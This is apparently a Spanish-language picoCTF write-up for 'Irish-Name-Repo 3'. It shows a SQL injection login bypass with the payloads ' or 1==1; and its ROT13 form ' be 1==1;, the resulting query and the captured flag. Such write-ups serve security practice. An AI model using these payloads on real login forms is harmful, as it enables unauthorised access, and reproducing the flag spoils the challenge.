# Irish-Name-Repo 3

## Objetivos
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/29132/` ([link](https://jupiter.challenges.picoctf.org/problem/29132/)) or http://jupiter.challenges.picoctf.org:29132. Try to see if you can login as admin!


## Solución 
```bash
Password =' or 1==1;


password: ' or 1==1;
SQL query: SELECT * FROM admin where password = '' be 1==1;'


# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}
```

## Notas adicionales 
al cambiar  el valor de debug a 1 e intentar la poner la contraseña  `' or 1==1;` nos aparece este menseje ` SQL query: SELECT * FROM admin where password = '' be 1==1;`  lo que indica que esta encriptada con la tecnica ROT 13 aparentemente, podeos utilizar una pagina como cyberchef para comprobar y efectivamente, entonces podemos utilizar  `' be 1==1;` como contraseña 